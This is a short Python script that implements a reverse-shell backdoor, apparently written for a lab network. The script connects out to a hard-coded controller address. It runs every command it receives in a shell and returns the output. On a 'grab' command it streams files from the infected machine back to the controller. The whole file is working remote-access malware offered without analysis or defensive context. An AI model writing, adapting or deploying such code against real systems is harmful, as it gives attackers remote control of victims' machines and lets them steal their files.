import socket, subprocess, os

def main():
    backdoor = Backdoor('192.168.159.132', 8080)
    backdoor.start()

class Backdoor:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port

    def start(self):
        self.connect()
        self.commander()

    def connect(self):
        self.sock = socket.socket()
        self.sock.connect((self.ip, self.port))
        return

    def commander(self):
        while True:
            command = self.sock.recv(1024)
            
            if 'kill' in command.decode():
                self.sock.close()
                return
            
            if 'grab' in command.decode():
                grab, path = command.decode().split('*')
                try:
                    self.transfer(self.sock, path)
                except:
                    self.sock.send('Error transferring file'.encode())
            
            CMD = subprocess.Popen(command.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            self.sock.send(CMD.stdout.read())
            self.sock.send(CMD.stderr.read())

    def transfer(self, socket, path):
        if os.path.exists(path):
            f = open(path, 'rb')
            packet = f.read(1024)
            while len(packet) > 0:
                socket.send(packet)
                packet = f.read(1024)
            socket.send('DONE'.encode())
        else:
            socket.send('File not found.'.encode())


if __name__ == '__main__':
    main()